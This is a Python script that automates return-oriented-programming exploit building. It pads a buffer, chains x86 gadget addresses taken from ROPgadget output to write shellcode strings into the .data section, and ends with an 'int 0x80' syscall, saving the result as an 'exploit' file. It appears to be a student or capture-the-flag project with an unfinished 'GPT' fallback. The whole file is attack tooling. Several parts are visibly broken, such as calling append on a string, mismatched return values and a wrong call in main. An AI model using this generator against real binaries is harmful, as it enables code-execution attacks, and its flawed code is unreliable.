#!/usr/bin/env python3

import re
import argparse
from pathlib import Path
from struct import pack

import Extracted_Functions


parser = argparse.ArgumentParser(
    description = "",
    formatter_class = argparse.ArgumentDefaultsHelpFormatter,
)

parser.add_argument("--shellcode", default= None)
parser.add_argument("--out-rop-path", default = None)


def generate_shellcode_chain(padding, out_rop_path, shellcode):
    gadgets, data_address = parse_out_rop(Path(out_rop_path))
    gadgets = removeNone(gadgets)
    rop_chain = b'A'*padding
    data_values = []
    null = None
    label_address_map,data_values = reads(shellcode, data_address,data_values)
    bytes_pushed,rop_addition,null  = chunking(data_values,data_address, null,label_address_map)
    rop_chain += rop_addition
    rop_chain, register_info = readinstructions(shellcode,data_address,data_values,label_address_map,rop_chain,gadgets, null)
    file_path = "exploit"
    try:
        with open(file_path, 'wb') as file:  # 'xb' mode for creating and writing in binary
            file.write(rop_chain)
    except FileExistsError:
        print(f"The file '{file_path}' already exists.")

    return file_path


def reads(file_name,data_address,data_values):
    rodata_start = False
    label_address_map = {}
    current_address = data_address
    try:
        with open(file_name, 'r') as file:
            for line in file:
                line = line.strip()  

                if '.rodata' in line:
                    rodata_start = True
                    continue
                if rodata_start:
                    if ':' in line:
                        label, data = line.split(':', 1)
                        label = label.strip()
                        data = data.strip()
                        label_address_map[label] = current_address 
                        if 'db' in data or 'dw' in data or 'dd' in data or 'dq' in data or 'dt' in data:
                            items, current_address = parse_assembly_line(data, current_address)
                            for item in items:
                                data_values.append(item)
                        elif 'equ' in data:
                            value = data.split(' ')[3]
                            if value in label_address_map:
                                data_values.append(len(data_values[0]))
                                current_address += len(data_values[0])

    except FileNotFoundError:
        print(f"The file {file_name} was not found.")
    except Exception as e:
         print(f"An error occurred: {e}")
    return label_address_map,data_values


def parse_out_rop(path: Path):
    rop_gadgets = {
        ": mov dword ptr [edx], eax ; ret": None,
        ": pop edx ; ret": None,
        ": pop eax ; ret": None,
        ": xor eax, eax ; ret": None,
        ": xor ecx, ecx ; ret": None,
        ": xor edx, edx ; ret": None,
        ": xor ebx, ebx ; ret": None,
        ": and edx, 0 ; ret": None, 
        ": sub edx, edx ; ret": None, 
        ": and eax, 0 ; ret": None,
        ": sub eax, edx ; ret": None,
        ": and ebx, 0 ; ret": None,
        ": sub ebx, edx ; ret": None, 
        ": and ecx, 0 ; ret": None,
        ": sub ecx, edx ; ret": None, 
        ": inc eax ; ret": None,
        ": inc ebx ; ret": None,
        ": inc ecx ; ret": None,
        ": inc edx ; ret": None,
        ": pop ebx ; ret": None,
        ": pop ecx ; ret": None,
        ": pop ecx ; pop ebx ; ret": None,
        ": int 0x80": None,
    }

    data_address = None
    data_addrPat = re.compile(r",\s*([^)]*)")

    with open(path) as out_rop:
        for line in out_rop:
            if ".data" in line and data_address is None:
                match = data_addrPat.search(line)
                if match:
                    extracted_part = match.group(1)
                    data_address = int(extracted_part,16)
            elif any(gadget in line for gadget in rop_gadgets.keys()):
                tokens = line.split()
                gadget_key = ' '.join(tokens[1:])
                rop_gadgets[gadget_key] = int(tokens[0],16)

    return rop_gadgets, data_address

def chunking(array, data_address, null,label_address_map):

    stack_pointer = data_address
    pointers = []
    rop_chain = b''
    first_time = True

    for string in array:
            
            if string in label_address_map:
                    rop_chain += Extracted_Functions.push_ptr(label_address_map[string], stack_pointer)
                    stack_pointer += 4

            elif (string == '0'):

                    if first_time:
                        null = stack_pointer
                        first_time = False
                    rop_chain += Extracted_Functions.push_null(stack_pointer)
                    stack_pointer += 4
            else:
                     
                    pointers.append(stack_pointer)
                    # Split string into chunks of size 4.
                    chunks = [string[i:i + 4] for i in range(0, len(string), 4)]
                    # Convert string to bytes.
                    chunks = [chunk.encode('ascii') for chunk in chunks]
                    # If the chunk isn't big enough, pad it with null characters.
                    chunks = [chunk.ljust(4, b'\0') for chunk in chunks]

                    for chunk in chunks:
                        rop_chain += Extracted_Functions.push_bytes(chunk, stack_pointer)
                        stack_pointer += 4
 
    bytes_pushed = stack_pointer - data_address
    return  bytes_pushed, rop_chain, null


def readinstructions(file_name, data_address, data_values, contents,rop_chain,gadgets,null):
    register_info = dict({'ebx': None,
                           'eax': None,
                           'ecx': None,
                           'edx': None,})
    try:
        with open(file_name, 'r') as file:
            for line in file:
                gpt_required = False
                gpt_lines = line.append()
                line = line.strip()
                if 'mov' in line:
                    parts = line.split()
                    if len(parts) > 1:
                        arg1 = parts[1].rstrip(',')
                        arg2 = parts[2].rstrip(',') if len(parts) > 2 else None
                        if arg1 and arg2:
                            rop_chain, register_info = mov(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null)
                            if gpt_required == True:
                                print("GPT required for mov")
                                gpt(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null,line,gpt_lines)

                elif 'xor' in line:
                    parts = line.split()
                    if len(parts) > 1:
                        arg1 = parts[1].rstrip(',')
                        arg2 = parts[2].rstrip(',') if len(parts) > 2 else None
                        if arg1 and arg2:
                            rop_chain = xor(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null)
                            if gpt_required == True:
                                print("GPT required for xor")
                                gpt(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null,line,gpt_lines)
                elif 'int' in line:
                    parts = line.split()
                    rop_chain = intline(parts[0],parts[1], data_values,contents,rop_chain,gadgets,register_info)
                    if gpt_required == True:
                        print("GPT required for int")
                        gpt(parts[0],parts[1], data_values,contents,rop_chain,gadgets,register_info,null,line,gpt_lines)

                else: 
                    print("Instruction not supported and Use GPT")
                    gpt_required = True
                    gpt(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null,line,gpt_lines)

    except FileNotFoundError:
        print(f"The file {file_name} was not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

    return rop_chain, register_info


def mov(ar1,ar2, data_values,contents,rop_chain,gadgets,register_info,null):
    if ar1 in ['ebx', 'ecx', 'edx', 'eax']:
        if ar2 in contents:
            if(ar1 == 'ecx'):
                if ": pop ecx ; ret" in gadgets: 
                    rop_chain += pack('<I', gadgets[": pop ecx ; ret"])
                    rop_chain += pack('<I', contents.get(ar2)) 
                    register_info[ar1] = ar2
                if ": pop ecx ; pop ebx ; ret" in gadgets:
                    rop_chain += pack('<I', gadgets[": pop ecx ; pop ebx ; ret"])
                    rop_chain += pack('<I', contents.get(ar2))
                    rop_chain += pack('<I', contents.get(register_info.get('ebx')))
                    register_info[ar1] = ar2
                else :
                    gpt_required = True
            elif(ar1 == 'ebx'):   
                if ": pop ebx ; ret" in gadgets: 
                    rop_chain += pack('<I', gadgets[": pop ebx ; ret"])
                    rop_chain += pack('<I', contents.get(ar2))
                    register_info[ar1] = ar2
                else :
                    gpt_required = True
            elif(ar1 == 'eax'):    
                if ": pop eax ; ret" in gadgets:
                    rop_chain += pack('<I', gadgets[": pop eax ; ret"])
                    rop_chain += pack('<I', contents.get(ar2))
                    register_info[ar1] = ar2
                else :
                    gpt_required = True
            elif(ar1 == 'edx'):    
                if ': pop edx ; ret' in gadgets:
                    rop_chain += pack('<I', gadgets[": pop edx ; ret"])
                    rop_chain += pack('<I', contents.get(ar2))
                    register_info[ar1] = ar2
                else: 
                    gpt_required = True

            

        elif (is_string_an_int(ar2)):
            rop_chain = xor(ar1,ar1,data_values,contents,rop_chain,gadgets,register_info,null)
            for i in range(int(ar2)):  
                if(ar1 == 'ecx'):
                    if ': inc ecx ; ret' in gadgets:
                        rop_chain += pack('<I', gadgets[": inc ecx ; ret"])
                        register_info[ar1] = ar2
                    else:
                        gpt_required = True

                elif(ar1 == 'edx'):
                    if ': inc edx ; ret' in gadgets:
                        rop_chain += pack('<I', gadgets[": inc edx ; ret"])
                        register_info[ar1] = ar2
                    else:
                        gpt_required = True

                elif(ar1 == 'eax'):
                    if ': inc eax ; ret' in gadgets:

                        rop_chain += pack('<I', gadgets[": inc eax ; ret"])
                        register_info[ar1] = ar2   
                    else: 
                        gpt_required = True
                
                elif(ar1 == 'ebx'):
                    if ': inc ebx ; ret' in gadgets:
                        rop_chain += pack('<I', gadgets[": inc ebx ; ret"])
                        register_info[ar1] = ar2
                    else:
                        gpt_required = True
        else:
            gpt_required = True                

    return rop_chain,register_info,gpt_required

def xor(ar1, ar2, data_values, contents,rop_chain,gadgets, register_info,null):
    
    if ar1 in ['ebx', 'ecx', 'edx', 'eax']:
        if (ar1 == 'edx'):
            condition1 = ': and edx, 0 ; ret' in gadgets
            condition2 = ': mov edx, 0 ; ret' in gadgets
            condition3 = ': sub edx, edx ; ret' in gadgets

            if ar1 == ar2:
                if ': xor edx, edx ; ret' in gadgets:
                    rop_chain += pack('<I', gadgets[": xor edx, edx ; ret"])
                elif condition1 or condition2 or condition3:
                    if condition1:
                         # Code to handle condition1
                         rop_chain += pack('<I', gadgets[': and edx, 0 ; ret'])
                    elif condition2:
                        # Code to handle condition2
                        rop_gadgets, register_info = mov(ar1, ar2, data_values, contents,rop_chain,gadgets, register_info)
                    elif condition3:
                        # Code to handle condition3
                        rop_chain += pack('<I', gadgets[': sub edx, edx ; ret'])
                elif ": pop edx ; ret" in gadgets: 
                            rop_chain += pack('<I', gadgets[": pop edx ; ret"])
                            rop_chain += pack('<I', null) 

                else: 
                    gpt_required = True
        elif (ar1 == 'ebx'):
            condition1 = ': and ebx, 0 ; ret' in gadgets
            condition2 = ': mov ebx, 0 ; ret' in gadgets
            condition3 = ': sub ebx, ebx ; ret' in gadgets
            if ar1 == ar2:
                if ': xor ebx, ebx ; ret' in gadgets:
                    rop_chain += pack('<I', gadgets[": xor ebx, ebx ; ret"])
                elif condition1 or condition2 or condition3:
                    if condition1:
                         # Code to handle condition1
                         rop_chain += pack('<I', gadgets[': and ebx, 0 ; ret'])
                    if condition2:
                        # Code to handle condition2
                        rop_gadgets, register_info = mov(ar1, ar2, data_values, contents,rop_chain,gadgets, register_info)
                    if condition3:
                        # Code to handle condition3
                        rop_chain += pack('<I', gadgets[': sub ebx, ebx ; ret'])
                elif ": pop ebx ; ret" in gadgets: 
                        rop_chain += pack('<I', gadgets[": pop ebx ; ret"])
                        rop_chain += pack('<I', null)

                else: 
                    gpt_required = True
                    
        elif (ar1 == 'ecx'):
            condition1 = ': and ecx, 0 ; ret' in gadgets
            condition2 = ': mov ecx, 0 ; ret' in gadgets
            condition3 = ': sub ecx, ecx ; ret' in gadgets

            if ar1 == ar2:
                if ': xor ecx, ecx ; ret' in gadgets:
                    rop_chain += pack('<I', gadgets[": xor ecx, ecx ; ret"])
                elif condition1 or condition2 or condition3:
                    if condition1:
                         # Code to handle condition1
                         rop_chain += pack('<I', gadgets[': and ecx, 0 ; ret'])
                    if condition2:
                        # Code to handle condition2
                        rop_gadgets, register_info = mov(ar1, ar2, data_values, contents,rop_chain,gadgets, register_info)
                    if condition3:
                        # Code to handle condition3
                        rop_chain += pack('<I', gadgets[': sub ecx, ecx ; ret'])
                    elif ": pop ecx ; ret" in gadgets: 
                        rop_chain += pack('<I', gadgets[": pop ecx ; ret"])
                        rop_chain += pack('<I', null)
                    else: 
                        gpt_required = True

        elif (ar1 == 'eax'):
            condition1 = ': and eax, 0 ; ret' in gadgets
            condition2 = ': mov eax, 0 ; ret' in gadgets
            condition3 = ': sub eax, eax ; ret' in gadgets

            if ar1 == ar2:
                if ': xor eax, eax ; ret' in gadgets:
                    rop_chain += pack('<I', gadgets[": xor eax, eax ; ret"])
                elif condition1 or condition2 or condition3:
                    if condition1:
                         # Code to handle condition1
                         rop_chain += pack('<I', gadgets[': and eax, 0 ; ret'])
                    if condition2:
                        # Code to handle condition2
                        rop_gadgets, register_info = mov(ar1, ar2, data_values, contents,rop_chain,gadgets, register_info)
                    if condition3:
                        # Code to handle condition3
                        rop_chain += pack('<I', gadgets[': sub eax, eax ; ret'])
                elif ": pop eax ; ret" in gadgets: 
                        rop_chain += pack('<I', gadgets[": pop eax ; ret"])
                        rop_chain += pack('<I', null)
                else:
                    gpt_required = True

        else: 
            gpt_required = True

    return rop_chain, gpt_required

def intline(ar1,ar2, data_values,contents,rop_chain,gadgets,register_info):

    if(ar2 == '0x80'):
        rop_chain += pack('<I', gadgets[": int 0x80"])
    else:
        gpt_required = True
    return rop_chain    

def is_string_an_int(s):
    try:
        int(s)
        return True
    except ValueError:
        return False

def removeNone(gadgets):
    for key in list(gadgets.keys()):  
        if gadgets[key] is None:
            del gadgets[key]
    return gadgets

def parse_assembly_line(data_line,current_address):
    # Determine the directive used (db, dw, dd, dq, dt)
    directive_match = re.search(r'db|dw|dd|dq|dt', data_line)
    if not directive_match:
        return [], 0  
    directive = directive_match.group()
    data_part = data_line.replace(directive, '').strip()
    pattern = r'\".*?\"|[^\s,]+'
    items = re.findall(pattern, data_part)

    processed_items = []
    for item in items:
        item = item.strip()
        if item.startswith('"') and item.endswith('"'):
            processed_items.append(item[1:-1])        
        elif item:
            processed_items.append(item.rstrip(','))
    bytes_per_item = {'db': 1, 'dw': 2, 'dd': 4, 'dq': 8, 'dt': 10}.get(directive, 1)
    for i in range(len(processed_items)):
        if(processed_items[i] == '0'):
            total_bytes = 4
            current_address += total_bytes
        else: 
            total_bytes = len(processed_items[i]) * bytes_per_item
            current_address += total_bytes
    return processed_items, current_address

def gpt(arg1, arg2, data_values, contents,rop_chain,gadgets, register_info,null,line,gpt_lines):
    gpt_address_line2 = None
    gpt_address_line = None
    if 'mov' in line:
        if arg2 in contents:
            gpt_address_line = contents.get(arg2)

    elif 'xor' in line:
        if arg2 in contents:
            gpt_address_line = contents.get(arg2)

    elif 'int' in line:
        parts = line.split()
        if parts[1] in contents:
            gpt_address_line = contents.get(parts)
                   
    else: 
        if contents in line :
            parts = line.split()
            if parts[1] in contents:
                gpt_address_line = contents.get(parts[1])
            elif parts[2] in contents:
                gpt_address_line = contents.get(parts[2])

            else:    
                if arg1 in contents:
                    gpt_address_line = contents.get(parts)
                if arg2 in contents:
                    gpt_address_line = contents.get(parts)
                if arg1 and arg2 in contents:
                    gpt_address_line = contents.get(arg1)
                    gpt_address_line2 = contents.get(arg2)

    # return gpt_address_line,gpt_address_line2, line, gpt_lines,rop_chain  

if __name__ == "__main__":
    generate_shellcode_chain(parser.parse_args())